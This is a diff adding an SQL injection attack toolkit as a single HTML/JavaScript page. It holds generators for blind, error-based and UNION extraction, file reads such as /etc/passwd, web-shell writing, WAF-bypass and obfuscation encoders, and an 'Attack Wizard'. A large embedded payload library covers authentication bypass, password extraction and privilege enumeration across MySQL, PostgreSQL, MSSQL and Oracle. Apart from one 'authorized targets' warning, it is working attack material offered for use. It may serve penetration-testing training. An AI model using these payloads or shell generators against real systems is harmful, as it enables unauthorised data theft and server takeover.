+                  <option value="boolean">Boolean (SUBSTRING + ASCII)</option>
+                  <option value="time-mysql">Time (MySQL SLEEP)</option>
+                  <option value="time-pgsql">Time (pg_sleep)</option>
+                  <option value="time-mssql">Time (WAITFOR)</option>
+                </select>
+              </div>
+              <div class="form-row">
+                <div class="label">Prefix</div>
+                <input type="text" class="input" id="ext-prefix" value="'" spellcheck="false">
+              </div>
+              <div class="form-row">
+                <div class="label">Comment</div>
+                <select class="select" id="ext-comment"><option value="-- -">-- -</option><option value="#">#</option></select>
+              </div>
+              <div class="form-row">
+                <div class="label">Max Characters to Extract</div>
+                <input type="number" class="input" id="ext-len" value="8" min="1" max="32">
+              </div>
+            </div>
+            <button class="btn btn-primary" onclick="generateExtractPayloads()">Generate Extraction Payloads</button>
+          </div>
+        </div>
+        <div id="ext-output" style="margin-top:12px"></div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════ ERROR INJECT -->
+    <div class="page" id="page-error-inject">
+      <div class="section-header">
+        <h1>💥 Error-Based Injection</h1>
+        <p>Extract data through verbose SQL error messages. Most effective when UNION fails but errors are visible.</p>
+      </div>
+
+      <div class="card">
+        <div class="card-header"><div class="card-title">⚙ Generator</div></div>
+        <div class="card-body">
+          <div class="form-grid">
+            <div class="form-row">
+              <div class="label">DBMS</div>
+              <select class="select" id="err-dbms">
+                <option value="mysql">MySQL (EXTRACTVALUE)</option>
+                <option value="mysql2">MySQL (UPDATEXML)</option>
+                <option value="pgsql">PostgreSQL (CAST)</option>
+                <option value="mssql">MSSQL (CONVERT)</option>
+              </select>
+            </div>
+            <div class="form-row">
+              <div class="label">Extract Expression</div>
+              <input type="text" class="input" id="err-expr" placeholder="version()" value="version()" spellcheck="false">
+            </div>
+            <div class="form-row">
+              <div class="label">Prefix</div>
+              <input type="text" class="input" id="err-prefix" value="'" spellcheck="false">
+            </div>
+            <div class="form-row">
+              <div class="label">Comment</div>
+              <select class="select" id="err-comment"><option value="-- -">-- -</option><option value="#">#</option></select>
+            </div>
+          </div>
+          <button class="btn btn-primary" onclick="generateErrorPayloads()">Generate</button>
+        </div>
+      </div>
+
+      <div id="err-output" style="margin-top:12px"></div>
+
+      <div class="divider"></div>
+      <div class="card">
+        <div class="card-header"><div class="card-title">📖 Error-Based Library</div></div>
+        <div class="card-body no-pad" id="err-lib"></div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════ ENUM BUILDER -->
+    <div class="page" id="page-enum-builder">
+      <div class="section-header">
+        <h1>🗄 DB Enumeration Query Builder</h1>
+        <p>Build INFORMATION_SCHEMA queries for any injection scenario. Configure once, generate all enumeration steps.</p>
+      </div>
+
+      <div class="card">
+        <div class="card-header"><div class="card-title">⚙ Context Config</div></div>
+        <div class="card-body">
+          <div class="form-grid form-grid-3">
+            <div class="form-row">
+              <div class="label">Injection Prefix</div>
+              <input type="text" class="input" id="qb-prefix" value="cn'" spellcheck="false">
+            </div>
+            <div class="form-row">
+              <div class="label">Comment</div>
+              <select class="select" id="qb-comment">
+                <option value="-- -">-- -</option>
+                <option value="#">#</option>
+              </select>
+            </div>
+            <div class="form-row">
+              <div class="label">Total Columns</div>
+              <input type="number" class="input" id="qb-cols" value="4" min="1" max="10">
+            </div>
+            <div class="form-row">
+              <div class="label">Visible Column (1-based)</div>
+              <input type="number" class="input" id="qb-visible" value="2" min="1" max="10">
+            </div>
+            <div class="form-row">
+              <div class="label">Target Database</div>
+              <input type="text" class="input" id="qb-db" placeholder="dev" spellcheck="false">
+            </div>
+            <div class="form-row">
+              <div class="label">Target Table</div>
+              <input type="text" class="input" id="qb-table" placeholder="credentials" spellcheck="false">
+            </div>
+          </div>
+          <button class="btn btn-primary" onclick="buildAllEnumQueries()">Build All Queries</button>
+        </div>
+      </div>
+
+      <div id="qb-output"></div>
+    </div>
+
+    <!-- ══════════════════════════════════════ FILE OPS -->
+    <div class="page" id="page-file-ops">
+      <div class="section-header">
+        <h1>📁 File Operations</h1>
+        <p>Read and write files via SQL injection. Requires FILE privilege and proper secure_file_priv configuration.</p>
+      </div>
+
+      <div class="info-box warn">
+        <strong>Prerequisites:</strong> User needs FILE privilege + secure_file_priv must be empty or set to accessible path. Check privileges page first.
+      </div>
+
+      <div class="tabs">
+        <div class="tab active" onclick="fileTab(this,'check')">0. Check Privs</div>
+        <div class="tab" onclick="fileTab(this,'read')">1. Read Files</div>
+        <div class="tab" onclick="fileTab(this,'write')">2. Write Files</div>
+        <div class="tab" onclick="fileTab(this,'webshell')">3. Web Shell</div>
+      </div>
+
+      <div id="file-tab-check">
+        <div class="info-box">Run these first to verify you can perform file operations.</div>
+        <div id="file-check-payloads"></div>
+      </div>
+      <div id="file-tab-read" style="display:none">
+        <div class="card">
+          <div class="card-header"><div class="card-title">⚙ File Read Generator</div></div>
+          <div class="card-body">
+            <div class="form-grid">
+              <div class="form-row">
+                <div class="label">File Path</div>
+                <input type="text" class="input" id="file-read-path" value="/etc/passwd" spellcheck="false">
+              </div>
+              <div class="form-row">
+                <div class="label">Injection Context</div>
+                <select class="select" id="file-read-ctx">
+                  <option value="union">UNION injection</option>
+                  <option value="select">Direct SELECT</option>
+                </select>
+              </div>
+              <div class="form-row">
+                <div class="label">Total Columns</div>
+                <input type="number" class="input" id="file-union-cols" value="4">
+              </div>
+              <div class="form-row">
+                <div class="label">Visible Column (1-based)</div>
+                <input type="number" class="input" id="file-union-vis" value="2">
+              </div>
+            </div>
+            <button class="btn btn-primary" onclick="generateFileRead()">Generate Read Payload</button>
+          </div>
+        </div>
+        <div id="file-read-output" style="margin-top:12px"></div>
+        <div class="divider"></div>
+        <div class="card">
+          <div class="card-header"><div class="card-title">📋 Common Sensitive Files</div></div>
+          <div class="card-body no-pad" id="common-files-list"></div>
+        </div>
+      </div>
+      <div id="file-tab-write" style="display:none">
+        <div class="card">
+          <div class="card-header"><div class="card-title">⚙ File Write Generator</div></div>
+          <div class="card-body">
+            <div class="form-row">
+              <div class="label">Output Path</div>
+              <input type="text" class="input" id="file-write-path" value="/var/www/html/proof.txt" spellcheck="false">
+            </div>
+            <div class="form-row" style="margin-top:8px">
+              <div class="label">Content to Write</div>
+              <textarea class="textarea" id="file-write-content" placeholder="file written successfully!">file written successfully!</textarea>
+            </div>
+            <div class="form-row" style="margin-top:8px">
+              <div class="label">Method</div>
+              <select class="select" id="file-write-method">
+                <option value="outfile">INTO OUTFILE</option>
+                <option value="dumpfile">INTO DUMPFILE (binary/single line)</option>
+              </select>
+            </div>
+            <button class="btn btn-primary" style="margin-top:8px" onclick="generateFileWrite()">Generate Write Payload</button>
+          </div>
+        </div>
+        <div id="file-write-output" style="margin-top:12px"></div>
+      </div>
+      <div id="file-tab-webshell" style="display:none">
+        <div class="info-box warn">
+          <strong>Warning:</strong> Writing a web shell grants full OS access as the web server user. Only use on authorized targets.
+        </div>
+        <div class="card">
+          <div class="card-header"><div class="card-title">⚙ Web Shell Generator</div></div>
+          <div class="card-body">
+            <div class="form-grid">
+              <div class="form-row">
+                <div class="label">Web Root Path</div>
+                <input type="text" class="input" id="ws-webroot" value="/var/www/html" spellcheck="false">
+              </div>
+              <div class="form-row">
+                <div class="label">Shell Filename</div>
+                <input type="text" class="input" id="ws-filename" value="shell.php" spellcheck="false">
+              </div>
+              <div class="form-row">
+                <div class="label">Shell Type</div>
+                <select class="select" id="ws-type">
+                  <option value="minimal">Minimal (system)</option>
+                  <option value="exec">exec()</option>
+                  <option value="passthru">passthru()</option>
+                  <option value="eval">eval() (obfuscated)</option>
+                  <option value="request">$_REQUEST parameter</option>
+                </select>
+              </div>
+              <div class="form-row">
+                <div class="label">Injection Columns</div>
+                <input type="number" class="input" id="ws-cols" value="4">
+              </div>
+            </div>
+            <button class="btn btn-primary" onclick="generateWebShell()">Generate Shell Payload</button>
+          </div>
+        </div>
+        <div id="ws-output" style="margin-top:12px"></div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════ PRIVESC -->
+    <div class="page" id="page-privesc">
+      <div class="section-header">
+        <h1>🔑 Privilege Enumeration</h1>
+        <p>Enumerate database user privileges, roles, and configuration to understand your attack surface.</p>
+      </div>
+      <div class="card">
+        <div class="card-header"><div class="card-title">⚙ Payload Config</div></div>
+        <div class="card-body">
+          <div class="form-grid">
+            <div class="form-row">
+              <div class="label">Total Columns</div>
+              <input type="number" class="input" id="priv-cols" value="4">
+            </div>
+            <div class="form-row">
+              <div class="label">Visible Column (1-based)</div>
+              <input type="number" class="input" id="priv-vis" value="2">
+            </div>
+            <div class="form-row">
+              <div class="label">Known Username (optional)</div>
+              <input type="text" class="input" id="priv-user" placeholder="root" spellcheck="false">
+            </div>
+          </div>
+          <button class="btn btn-primary" onclick="generatePrivPayloads()">Generate</button>
+        </div>
+      </div>
+      <div id="priv-output" style="margin-top:12px"></div>
+    </div>
+
+    <!-- ══════════════════════════════════════ WAF BYPASS -->
+    <div class="page" id="page-waf-bypass">
+      <div class="section-header">
+        <h1>🛡 WAF Bypass Transformer</h1>
+        <p>Apply one or more bypass transforms to any payload. Stack multiple techniques for deeper evasion.</p>
+      </div>
+
+      <div class="card">
+        <div class="card-header"><div class="card-title">⚙ Bypass Engine</div></div>
+        <div class="card-body">
+          <div class="form-row">
+            <div class="label">Input Payload</div>
+            <textarea class="textarea" id="waf-input" style="min-height:60px" placeholder="' UNION SELECT 1,2,3,4-- -" spellcheck="false"></textarea>
+          </div>
+          <div class="form-row" style="margin-top:10px">
+            <div class="label">Apply Bypass Techniques (can stack multiple)</div>
+            <div style="margin-top:6px" id="bypass-chips"></div>
+          </div>
+          <div style="margin-top:10px;display:flex;gap:8px">
+            <button class="btn btn-primary" onclick="applyBypass()">Transform</button>
+            <button class="btn btn-outline" onclick="clearBypass()">Clear</button>
+          </div>
+        </div>
+      </div>
+
+      <div id="waf-output" style="margin-top:12px"></div>
+
+      <div class="divider"></div>
+      <div class="card">
+        <div class="card-header"><div class="card-title">📖 WAF Bypass Reference</div></div>
+        <div class="card-body no-pad" id="waf-lib"></div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════ ENCODER -->
+    <div class="page" id="page-encoder">
+      <div class="section-header">
+        <h1>🔤 Encoder / Decoder Suite</h1>
+        <p>Real-time encoding and decoding for payload obfuscation and WAF evasion.</p>
+      </div>
+
+      <div class="form-row">
+        <div class="label">Input String</div>
+        <textarea class="textarea" id="enc-input" placeholder="Enter string or payload to encode/decode..." spellcheck="false" oninput="encodeAll()"></textarea>
+      </div>
+
+      <div class="grid-2" style="margin-top:12px">
+        <div class="card">
+          <div class="card-header"><div class="card-title">URL Encode</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-url').textContent)">Copy</button></div>
+          <div class="card-body"><div class="enc-output" id="out-url">—</div></div>
+        </div>
+        <div class="card">
+          <div class="card-header"><div class="card-title">URL Decode</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-urld').textContent)">Copy</button></div>
+          <div class="card-body"><div class="enc-output" id="out-urld">—</div></div>
+        </div>
+        <div class="card">
+          <div class="card-header"><div class="card-title">Base64 Encode</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-b64').textContent)">Copy</button></div>
+          <div class="card-body"><div class="enc-output" id="out-b64">—</div></div>
+        </div>
+        <div class="card">
+          <div class="card-header"><div class="card-title">Base64 Decode</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-b64d').textContent)">Copy</button></div>
+          <div class="card-body"><div class="enc-output" id="out-b64d">—</div></div>
+        </div>
+        <div class="card">
+          <div class="card-header"><div class="card-title">Hex Encode (0x…)</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-hex').textContent)">Copy</button></div>
+          <div class="card-body"><div class="enc-output" id="out-hex">—</div></div>
+        </div>
+        <div class="card">
+          <div class="card-header"><div class="card-title">Hex Decode</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-hexd').textContent)">Copy</button></div>
+          <div class="card-body"><div class="enc-output" id="out-hexd">—</div></div>
+        </div>
+        <div class="card">
+          <div class="card-header"><div class="card-title">CHAR() Encode</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-char').textContent)">Copy</button></div>
+          <div class="card-body"><div class="enc-output" id="out-char">—</div></div>
+        </div>
+        <div class="card">
+          <div class="card-header"><div class="card-title">Double URL Encode</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-durl').textContent)">Copy</button></div>
+          <div class="card-body"><div class="enc-output" id="out-durl">—</div></div>
+        </div>
+        <div class="card">
+          <div class="card-header"><div class="card-title">HTML Entities</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-html').textContent)">Copy</button></div>
+          <div class="card-body"><div class="enc-output" id="out-html">—</div></div>
+        </div>
+        <div class="card">
+          <div class="card-header"><div class="card-title">MySQL Hex (0x…)</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-mhex').textContent)">Copy</button></div>
+          <div class="card-body"><div class="enc-output" id="out-mhex">—</div></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════ PAYLOAD LIB -->
+    <div class="page" id="page-payload-lib">
+      <div class="section-header">
+        <h1>📚 Full Payload Library</h1>
+        <p>Searchable, categorized collection of all SQLi payloads across all attack types and databases.</p>
+      </div>
+      <div class="form-row">
+        <input type="text" class="input" id="lib-search" placeholder="Search payloads, descriptions, techniques..." oninput="searchLib()" style="font-size:13px;padding:9px 12px" spellcheck="false">
+      </div>
+      <div class="search-results-count" id="lib-count"></div>
+      <div id="lib-output"></div>
+    </div>
+
+    <!-- ══════════════════════════════════════ REFERENCE -->
+    <div class="page" id="page-reference">
+      <div class="section-header">
+        <h1>📖 Quick Reference</h1>
+        <p>MySQL/MariaDB cheat sheet — common paths, error messages, and operator precedence.</p>
+      </div>
+      <div id="reference-content"></div>
+    </div>
+
+  </div><!-- end #main -->
+
+<!-- pages injected via JS --></div><!-- end #app -->
+
+<!-- NOTIFICATION CONTAINER -->
+<div id="notif-container"></div>
+
+<!-- WIZARD OVERLAY -->
+<div id="wizard-overlay">
+  <div id="wizard-modal">
+    <div id="wizard-header">
+      <div id="wizard-title">Attack Wizard</div>
+      <button id="wizard-close" onclick="closeWizard()">✕</button>
+    </div>
+    <div id="wizard-progress"></div>
+    <div id="wizard-body"></div>
+    <div id="wizard-footer">
+      <div id="wizard-step-counter"></div>
+      <div style="display:flex;gap:8px">
+        <button class="btn btn-outline" id="wiz-prev" onclick="wizNav(-1)">← Prev</button>
+        <button class="btn btn-primary" id="wiz-next" onclick="wizNav(1)">Next →</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+'use strict';
+
+// ═══════════════════════════════════════════════════════════
+// UTILITIES
+// ═══════════════════════════════════════════════════════════
+
+function copyText(text) {
+  if (!text || text === '—') return;
+  if (navigator.clipboard && window.isSecureContext) {
+    navigator.clipboard.writeText(text).then(() => showNotif('Copied!', 'success')).catch(() => fallbackCopy(text));
+  } else { fallbackCopy(text); }
+}
+
+function fallbackCopy(text) {
+  const ta = document.createElement('textarea');
+  ta.value = text;
+  ta.style.cssText = 'position:fixed;left:-9999px;top:-9999px';
+  document.body.appendChild(ta);
+  ta.focus(); ta.select();
+  try { document.execCommand('copy'); showNotif('Copied!', 'success'); }
+  catch { showNotif('Copy failed', 'error'); }
+  document.body.removeChild(ta);
+}
+
+function showNotif(msg, type = 'info') {
+  const c = document.getElementById('notif-container');
+  const el = document.createElement('div');
+  el.className = `notif notif-${type}`;
+  const icon = type === 'success' ? '✓' : type === 'error' ? '✕' : 'ℹ';
+  el.innerHTML = `<span>${icon}</span><span>${msg}</span>`;
+  c.appendChild(el);
+  setTimeout(() => { el.style.opacity = '0'; el.style.transition = 'opacity .3s'; setTimeout(() => el.remove(), 300); }, 2500);
+}
+
+function esc(str) {
+  return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+function makePayloadItem(payload, desc, tags = []) {
+  const tagHtml = tags.map(t => `<span class="tag tag-${t.c}">${t.l}</span>`).join(' ');
+  return `<div class="payload-item">
+    <div style="flex:1">
+      <div class="payload-code">${esc(payload)}</div>
+      ${desc ? `<div class="payload-desc">${esc(desc)} ${tagHtml}</div>` : (tagHtml ? `<div class="payload-desc">${tagHtml}</div>` : '')}
+    </div>
+    <div class="payload-actions">
+      <button class="btn btn-copy" onclick="copyPayload(this,'${esc(payload).replace(/'/g,"\\'")}')">⎘ Copy</button>
+    </div>
+  </div>`;
+}
+
+function copyPayload(btn, payload) {
+  const decoded = payload.replace(/&#39;/g,"'").replace(/&amp;/g,'&').replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&quot;/g,'"');
+  copyText(decoded);
+  const old = btn.textContent;
+  btn.textContent = '✓ Done';
+  btn.classList.add('copied');
+  setTimeout(() => { btn.textContent = old; btn.classList.remove('copied'); }, 1500);
+}
+
+function buildSection(title, payloads) {
+  return `<div class="card" style="margin-bottom:12px">
+    <div class="card-header"><div class="card-title">${esc(title)}</div><span class="tag tag-blue">${payloads.length}</span></div>
+    <div class="card-body no-pad">${payloads.map(p => makePayloadItem(p.payload, p.desc, p.tags||[])).join('')}</div>
+  </div>`;
+}
+
+function buildCol(cols, vis, prefix, comment, injection) {
+  const parts = [];
+  for (let i = 1; i <= cols; i++) {
+    if (i === vis) parts.push(injection);
+    else parts.push(i === vis - 1 ? '1' : i.toString());
+  }
+  // rebuild so visible is at vis position
+  const a = [];
+  for (let i = 1; i <= cols; i++) {
+    if (i === vis) a.push(injection);
+    else a.push(i.toString());
+  }
+  return `${prefix} UNION SELECT ${a.join(',')} ${comment}`;
+}
+
+// ═══════════════════════════════════════════════════════════
+// NAVIGATION
+// ═══════════════════════════════════════════════════════════
+
+function nav(id) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+  const page = document.getElementById('page-' + id);
+  if (page) page.classList.add('active');
+  const navItems = document.querySelectorAll('.nav-item');
+  navItems.forEach(n => { if (n.getAttribute('onclick') && n.getAttribute('onclick').includes(id)) n.classList.add('active'); });
+}
+
+// ═══════════════════════════════════════════════════════════
+// PAYLOAD DATABASE
+// ═══════════════════════════════════════════════════════════
+
+const DB = {
+  discovery: [
+    {payload:"'", desc:"Basic quote — causes syntax error if injectable"},
+    {payload:'\"', desc:"Double quote test"},
+    {payload:"'--", desc:"Comment truncation test"},
+    {payload:"' OR '1'='1", desc:"OR logic injection test"},
+    {payload:"' AND '1'='1", desc:"AND logic test (true)"},
+    {payload:"' AND '1'='2", desc:"AND logic test (false) — page should differ from above"},
+    {payload:"1 AND 1=1", desc:"Numeric context — true"},
+    {payload:"1 AND 1=2", desc:"Numeric context — false"},
+    {payload:"' AND SLEEP(5)-- -", desc:"MySQL time test (wait 5s = injectable)"},
+    {payload:"' AND pg_sleep(5)-- -", desc:"PostgreSQL time test"},
+    {payload:"'; WAITFOR DELAY '00:00:05'-- -", desc:"MSSQL time test"},
+    {payload:"SELECT @@version", desc:"MySQL version fingerprint"},
+    {payload:"SELECT version()", desc:"PostgreSQL version fingerprint"},
+    {payload:"' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -", desc:"MySQL error fingerprint"},
+  ],
+  auth: [
+    {payload:"' OR '1'='1", desc:"Basic OR bypass — string context"},
+    {payload:"' OR '1'='1'-- -", desc:"OR bypass with comment"},
+    {payload:"' OR '1'='1'#", desc:"OR bypass with hash comment"},
+    {payload:"' OR '1'='1'/*", desc:"OR bypass with inline comment"},
+    {payload:"admin'-- -", desc:"Comment truncation — bypass password check if username known"},
+    {payload:"admin'#", desc:"Hash comment bypass"},
+    {payload:"admin'/*", desc:"Inline comment bypass"},
+    {payload:"admin' OR '1'='1", desc:"Username field OR bypass"},
+    {payload:"admin' OR '1'='1'-- -", desc:"Username + full comment"},
+    {payload:"admin') OR ('1'='1", desc:"Parenthesis close + OR"},
+    {payload:"admin')-- -", desc:"Parenthesis + comment — use when id>1 check present"},
+    {payload:"' OR ''='", desc:"Empty string equality"},
+    {payload:"' OR 1=1-- -", desc:"Numeric OR bypass"},
+    {payload:"' OR 1-- -", desc:"Truthy value bypass"},
+    {payload:"') OR '1'='1-- -", desc:"Paren close OR"},
+    {payload:"') OR ('1'='1'-- -", desc:"Double paren"},
+    {payload:"1 OR 1=1", desc:"Numeric context bypass"},
+    {payload:"1 OR 1=1-- -", desc:"Numeric + comment"},
+    {payload:"\" OR \"1\"=\"1", desc:"Double quote variant"},
+    {payload:"admin\"-- -", desc:"Double quote comment bypass"},
+    {payload:"' OR 'x'='x", desc:"x=x variant"},
+    {payload:"' OR 'abc'='abc", desc:"string match always true"},
+    {payload:"' OR 1 LIKE 1-- -", desc:"LIKE operator bypass"},
+    {payload:"' OR 1 BETWEEN 0 AND 2-- -", desc:"BETWEEN operator bypass"},
+    {payload:"' OR 1 IN (1)-- -", desc:"IN operator bypass"},
+    {payload:"' OR NOT 1=2-- -", desc:"NOT operator subversion"},
+    {payload:"' OR NULL IS NULL-- -", desc:"NULL check bypass"},
+    {payload:"'/**/OR/**/'1'='1", desc:"Comment as whitespace WAF bypass"},
+    {payload:"'%09OR%09'1'='1", desc:"Tab as whitespace"},
+    {payload:"'%0aOR%0a'1'='1", desc:"Newline as whitespace"},
+    {payload:"' oR '1'='1", desc:"Mixed case OR"},
+    {payload:"' Or '1'='1", desc:"Mixed case variant 2"},
+    {payload:"SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/", desc:"Polyglot sleep bypass"},
+    {payload:"' OR SLEEP(0)-- -", desc:"Silent sleep — true condition"},
+    {payload:"' OR SLEEP(5)-- -", desc:"Sleep bypass — injectable if delayed"},
+  ],
+  bool: [
+    {payload:"' AND 1=1-- -", desc:"Boolean true — page should load normally"},
+    {payload:"' AND 1=2-- -", desc:"Boolean false — page should differ"},
+    {payload:"' AND '1'='1'-- -", desc:"String boolean true"},
+    {payload:"' AND '1'='2'-- -", desc:"String boolean false"},
+    {payload:"' AND SUBSTRING(username,1,1)='a'-- -", desc:"First char of username is 'a'"},
+    {payload:"' AND SUBSTRING(username,1,1)='b'-- -", desc:"First char is 'b'"},
+    {payload:"' AND ASCII(SUBSTRING(username,1,1))>64-- -", desc:"ASCII value > 64 (above @)"},
+    {payload:"' AND ASCII(SUBSTRING(username,1,1))>96-- -", desc:"ASCII > 96 (above backtick, lowercase letters)"},
+    {payload:"' AND ASCII(SUBSTRING(username,1,1))<123-- -", desc:"ASCII < 123 (below {, narrow range)"},
+    {payload:"' AND LENGTH(username)>5-- -", desc:"Username length > 5"},
+    {payload:"' AND LENGTH(username)=8-- -", desc:"Username length = 8"},
+    {payload:"' AND CHAR_LENGTH(username)>5-- -", desc:"CHAR_LENGTH variant"},
+    {payload:"' AND (SELECT COUNT(*) FROM users)>0-- -", desc:"users table exists and has rows"},
+    {payload:"' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>3-- -", desc:"DB has > 3 tables"},
+    {payload:"' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 0,1)='a'-- -", desc:"First char of first password"},
+    {payload:"' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users LIMIT 0,1)>64-- -", desc:"Binary search on password char"},
+    {payload:"' AND MID(username,1,1)='a'-- -", desc:"MID() alternative to SUBSTRING"},
+    {payload:"' AND ORD(MID(username,1,1))>64-- -", desc:"ORD() returns ASCII value"},
+    {payload:"' AND IF(1=1,1,0)-- -", desc:"IF conditional — true path"},
+    {payload:"' AND IF(1=2,1,0)-- -", desc:"IF conditional — false path"},
+    {payload:"' AND (SELECT 'a')='a'-- -", desc:"Subquery equality test"},
+  ],
+  time_mysql: [
+    {payload:"' AND SLEEP(5)-- -", desc:"MySQL — 5s delay if injectable"},
+    {payload:"' OR SLEEP(5)-- -", desc:"OR-based sleep"},
+    {payload:"1 AND SLEEP(5)-- -", desc:"Numeric context sleep"},
+    {payload:"' AND IF(1=1,SLEEP(5),0)-- -", desc:"Conditional sleep — true"},
+    {payload:"' AND IF(1=2,SLEEP(5),0)-- -", desc:"Conditional sleep — false (no delay)"},
+    {payload:"' AND IF(SUBSTRING(username,1,1)='a',SLEEP(5),0)-- -", desc:"Sleep if first char is 'a'"},
+    {payload:"' AND IF(ASCII(SUBSTRING(username,1,1))>64,SLEEP(5),0)-- -", desc:"Binary search with sleep"},
+    {payload:"' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)-- -", desc:"Sleep if users table exists"},
+    {payload:"' AND IF(LENGTH(database())>4,SLEEP(5),0)-- -", desc:"Sleep if DB name length > 4"},
+    {payload:"'; SELECT SLEEP(5)-- -", desc:"Stacked query sleep (if supported)"},
+  ],
+  time_pgsql: [
+    {payload:"' AND pg_sleep(5)-- -", desc:"PostgreSQL — 5s delay"},
+    {payload:"'; SELECT pg_sleep(5)-- -", desc:"Stacked query"},
+    {payload:"' OR pg_sleep(5)-- -", desc:"OR-based"},
+    {payload:"' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -", desc:"Conditional sleep"},
+    {payload:"' AND (SELECT CASE WHEN (SUBSTRING(current_database(),1,1)='p') THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -", desc:"DB name extraction via sleep"},
+  ],
+  time_mssql: [
+    {payload:"'; WAITFOR DELAY '00:00:05'-- -", desc:"MSSQL — 5s delay"},
+    {payload:"' AND WAITFOR DELAY '00:00:05'-- -", desc:"AND-based"},
+    {payload:"' OR WAITFOR DELAY '00:00:05'-- -", desc:"OR-based"},
+    {payload:"' IF(1=1) WAITFOR DELAY '00:00:05'-- -", desc:"Conditional wait"},
+    {payload:"'; IF(1=1) WAITFOR DELAY '00:00:05'-- -", desc:"Stacked conditional"},
+  ],
+  time_oracle: [
+    {payload:"' AND DBMS_LOCK.SLEEP(5)-- -", desc:"Oracle DBMS_LOCK sleep"},
+    {payload:"' AND (SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE NULL END FROM dual)-- -", desc:"Conditional Oracle sleep"},
+    {payload:"' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -", desc:"Pipe-based delay"},
+  ],
+  error_mysql: [
+    {payload:"' AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))-- -", desc:"EXTRACTVALUE — extract DB version"},
+    {payload:"' AND EXTRACTVALUE(1,CONCAT(0x7e,user(),0x7e))-- -", desc:"EXTRACTVALUE — current user"},
+    {payload:"' AND EXTRACTVALUE(1,CONCAT(0x7e,database(),0x7e))-- -", desc:"EXTRACTVALUE — current database"},
+    {payload:"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e))-- -", desc:"EXTRACTVALUE — first table name"},
+    {payload:"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),0x7e))-- -", desc:"EXTRACTVALUE — first column in users"},
+    {payload:"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 0,1),0x7e))-- -", desc:"EXTRACTVALUE — first password"},
+    {payload:"' AND UPDATEXML(1,CONCAT(0x7e,version(),0x7e),1)-- -", desc:"UPDATEXML — version"},
+    {payload:"' AND UPDATEXML(1,CONCAT(0x7e,user(),0x7e),1)-- -", desc:"UPDATEXML — current user"},
+    {payload:"' AND UPDATEXML(1,CONCAT(0x7e,database(),0x7e),1)-- -", desc:"UPDATEXML — database name"},
+    {payload:"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT schema_name FROM information_schema.schemata LIMIT 0,1),0x7e),1)-- -", desc:"UPDATEXML — first database name"},
+    {payload:"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1),0x7e),1)-- -", desc:"UPDATEXML — second table"},
+    {payload:"' AND GeometryCollection((SELECT * FROM (SELECT * FROM (SELECT user())a)b))-- -", desc:"GeometryCollection error"},
+    {payload:"' AND polygon((SELECT * FROM (SELECT * FROM (SELECT version())a)b))-- -", desc:"Polygon error"},
+    {payload:"' AND exp(~(SELECT * FROM (SELECT user())a))-- -", desc:"EXP error — double negation overflow"},
+  ],
+  error_pgsql: [
+    {payload:"' AND 1=CAST((SELECT version()) AS INT)-- -", desc:"PostgreSQL CAST error — version"},
+    {payload:"' AND 1=CAST((SELECT current_database()) AS INT)-- -", desc:"CAST — database name"},
+    {payload:"' AND 1=CAST((SELECT usename FROM pg_user LIMIT 1) AS INT)-- -", desc:"CAST — username"},
+    {payload:"' AND 1=CAST((SELECT password FROM pg_shadow LIMIT 1) AS INT)-- -", desc:"CAST — pg_shadow password hash"},
+  ],
+  error_mssql: [
+    {payload:"' AND 1=CONVERT(INT,(SELECT @@version))-- -", desc:"MSSQL CONVERT — version"},
+    {payload:"' AND 1=CONVERT(INT,(SELECT current_user))-- -", desc:"CONVERT — current user"},
+    {payload:"' AND 1=CONVERT(INT,(SELECT name FROM sys.databases WHERE database_id=1))-- -", desc:"CONVERT — first database"},
+    {payload:"' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM sys.tables))-- -", desc:"CONVERT — first table"},
+  ],
+  union_detect: [], // generated dynamically
+  file_check: [
+    {payload:"cn' UNION SELECT 1,user(),3,4-- -", desc:"Current DB user"},
+    {payload:"cn' UNION SELECT 1,super_priv,3,4 FROM mysql.user WHERE user=user()-- -", desc:"Check super privilege"},
+    {payload:"cn' UNION SELECT 1,grantee,privilege_type,4 FROM information_schema.user_privileges WHERE grantee=CONCAT('''',user(),'@localhost''')-- -", desc:"All privileges for current user"},
